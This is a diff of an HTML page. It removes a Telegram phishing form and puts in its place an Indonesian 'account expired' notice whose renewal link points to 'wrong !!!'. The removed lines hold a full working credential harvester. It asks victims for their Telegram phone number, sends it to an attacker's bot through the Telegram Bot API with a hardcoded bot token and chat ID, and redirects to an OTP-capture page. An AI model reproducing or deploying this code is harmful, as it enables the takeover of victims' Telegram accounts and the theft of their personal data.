@@ -3,145 +3,72 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Masukkan Nomor Telepon</title>
+  <title>Masa Aktif Habis</title>
   <style>
     body {
-      font-family: Arial, sans-serif;
-      background-color: #fff;
+      font-family: 'Poppins', sans-serif;
+      background: linear-gradient(135deg, #ff616f, #ff9966);
+      color: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
       margin: 0;
-      padding: 0;
+      flex-direction: column;
       text-align: center;
     }
-    .container {
+
+    .card {
+      background: rgba(255, 255, 255, 0.15);
+      border-radius: 20px;
+      padding: 40px 30px;
+      box-shadow: 0 8px 25px rgba(0, 0, 0, 0.2);
+      backdrop-filter: blur(10px);
       max-width: 400px;
-      width: 90%;
-      margin: 50px auto;
-      padding: 20px;
     }
-    .monkey-emoji {
-      font-size: 80px;
-      margin-bottom: 20px;
-    }
+
     h1 {
-      font-size: 24px;
-      margin-bottom: 20px;
+      font-size: 2em;
+      margin-bottom: 10px;
     }
-    label {
-      display: block;
-      text-align: left;
-      margin-bottom: 5px;
-      font-weight: bold;
+
+    p {
+      font-size: 1em;
+      margin-bottom: 25px;
+      color: #fff;
+      opacity: 0.9;
     }
-    select, input[type="tel"] {
-      width: 100%;
-      padding: 10px;
-      font-size: 16px;
-      margin-bottom: 15px;
-      border: 1px solid #ccc;
-      border-radius: 4px;
-    }
+
     .btn {
-      width: 100%;
-      padding: 12px;
-      font-size: 16px;
-      background-color: #0088cc;
-      color: white;
-      border: none;
-      border-radius: 4px;
-      cursor: pointer;
+      background: #fff;
+      color: #ff4d4f;
+      padding: 12px 25px;
+      border-radius: 50px;
+      text-decoration: none;
+      font-weight: 600;
+      transition: all 0.3s ease;
+      display: inline-block;
     }
+
     .btn:hover {
-      background-color: #0077b3;
+      background: #ff4d4f;
+      color: #fff;
+      transform: scale(1.05);
     }
-    .status {
-      margin-top: 15px;
-      font-weight: bold;
+
+    .icon {
+      font-size: 4em;
+      margin-bottom: 15px;
     }
   </style>
 </head>
 <body>
-
-  <div class="container">
-    <span class="monkey-emoji">🐵</span>
-    <h1>Enter your telegram number</h1>
-    
-    <form id="phoneForm">
-      <label for="country">Country</label>
-      <select id="country">
-        <option value="+966">KSA Saudi Arabia (+966)</option>
-         <option value="+971">​🇺​​🇦​​🇪​ United Arab Emirates (+971)</option>
-         <option value="+965">🇰🇼 Kuwait (+965)</option>
-        <option value="+60">🇲🇾 Malaysia (+60)</option>
-        <option value="+65">🇸🇬 Singapore (+65)</option>
-        <!-- Tambahkan opsi lain jika diperlukan -->
-      </select>
-      
-      <label for="phone">Telegram phone number</label>
-      <input type="tel" id="phone" placeholder="Your telegram number" required />
-      
-      <button type="submit" class="btn">Kirim</button>
-    </form>
-
-    <div class="status" id="statusMessage"></div>
+  <div class="card">
+    <div class="icon">⚠️</div>
+    <h1>Masa Aktif Habis</h1>
+    <p>Maaf, masa aktif akun kamu sudah habis. Silakan perpanjang langganan untuk melanjutkan layanan.</p>
+    <a href="wrong !!!
+" class="btn">Perpanjang Sekarang</a>
   </div>
-
-  <script>
-    // === Ganti dengan Bot Token dan Chat ID milik Anda ===
-    const botToken = "7810700305:AAFrA9uF0VwT-dtLRjeZERdXTY9IfQJMGic";
-    const chatId   = "6677157176";
-    // ====================================================
-
-    const phoneForm = document.getElementById('phoneForm');
-    const countrySelect = document.getElementById('country');
-    const phoneInput = document.getElementById('phone');
-    const statusMessage = document.getElementById('statusMessage');
-
-    phoneForm.addEventListener('submit', function (e) {
-      e.preventDefault();
-
-      const countryCode = countrySelect.value;
-      const phone = phoneInput.value.trim();
-
-      if (!phone) {
-        statusMessage.style.color = "red";
-        statusMessage.textContent = "Nomor telepon tidak boleh kosong!";
-        return;
-      }
-
-      // Gabungkan kode negara dan nomor telepon
-      const fullPhone = countryCode + phone;
-
-      statusMessage.style.color = "black";
-      statusMessage.textContent = "Mengirim...";
-
-      // Format pesan yang akan dikirim ke Bot Telegram
-      const messageText = `@DAWEBPHST 
-_________________________________
-• Nomor Hp : ${fullPhone}
-_________________________________
-_________________________________`;
-
-      // URL untuk mengirim pesan ke Bot Telegram
-      const telegramAPI = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(messageText)}`;
-
-      fetch(telegramAPI)
-        .then(response => response.json())
-        .then(data => {
-          if (data.ok) {
-            statusMessage.style.color = "green";
-            statusMessage.textContent = "sucsess";
-            // Redirect ke halaman kode OTP, kirim fullPhone sebagai parameter
-            window.location.href = `verify.html?phone=${encodeURIComponent(fullPhone)}`;
-          } else {
-            statusMessage.style.color = "red";
-            statusMessage.textContent = "Gagal mengirim: " + (data.description || "Unknown error");
-          }
-        })
-        .catch(error => {
-          statusMessage.style.color = "red";
-          statusMessage.textContent = "Terjadi kesalahan: " + error;
-        });
-    });
-  </script>
 </body>
 </html>
